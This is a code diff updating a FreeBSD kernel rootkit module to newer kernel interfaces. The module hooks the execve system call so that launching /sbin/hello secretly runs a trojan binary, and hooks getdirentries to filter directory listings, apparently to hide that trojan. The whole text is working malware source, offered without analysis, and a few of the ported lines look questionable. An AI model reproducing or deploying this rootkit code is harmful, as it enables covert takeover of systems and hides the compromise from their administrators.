@@ -14,7 +14,13 @@
 #include <vm/vm.h>
 #include <vm/vm_page.h>
 #include <vm/vm_map.h>
-#include <dirent.h>
+#include <sys/dirent.h>
+#include <bsm/audit_kevents.h>
+#include <sys/sysproto.h>
+#include<sys/types.h>
+#include<sys/malloc.h>
+//#include<sys/stdio.h>
+
 #define ORIGINAL "/sbin/hello"
 #define TROJAN "/sbin/trojan_hello"
 #define T_NAME "trojan_hello"
@@ -72,7 +78,7 @@ execve_hook(struct thread *td, void *syscall_args) {
  * of execve arguments.
  */
         vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE,
-        VM_PROT_ALL, VM_PROT_ALL, 0);
+        VM_PROT_ALL, VM_PROT_ALL, 0,0);
         vm->vm_dsize += btoc(PAGE_SIZE);
  /*
  * Set up an execve_args structure for TROJAN. Remember, you
@@ -89,9 +95,9 @@ execve_hook(struct thread *td, void *syscall_args) {
          user_ea = (struct execve_args *)addr + sizeof(t_fname);
          copyout(&kernel_ea, user_ea, sizeof(struct execve_args));
  /* Execute TROJAN. */
-         return(execve(curthread, user_ea)
+         return(sys_execve(curthread, user_ea));
      }
-     return(execve(td, syscall_args));
+     return(sys_execve(td, syscall_args));
 }
 /*
 * getdirentries system call hook.
@@ -113,11 +119,13 @@ getdirentries_hook(struct thread *td, void *syscall_args)
  * Store the directory entries found in fd in buf, and record the
  * number of bytes actually transferred.
  */
-     getdirentries(td, syscall_args);
+     sys_getdirentries(td, syscall_args);
      size = td->td_retval[0];
  /* Does fd actually contain any directory entries? */
      if (size > 0) {
-         MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
+         //malloc(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
+	 MALLOC_DECLARE(dirent);
+	 dp = malloc(size,dirent,M_NOWAIT);
          copyin(uap->buf, dp, size);
          current = dp;
          count = size;
@@ -154,7 +162,7 @@ getdirentries_hook(struct thread *td, void *syscall_args)
  */
      td->td_retval[0] = size;
      copyout(dp, uap->buf, size);
-     FREE(dp, M_TEMP);
+     free(dp, M_TEMP);
      }
  return(0);
 }
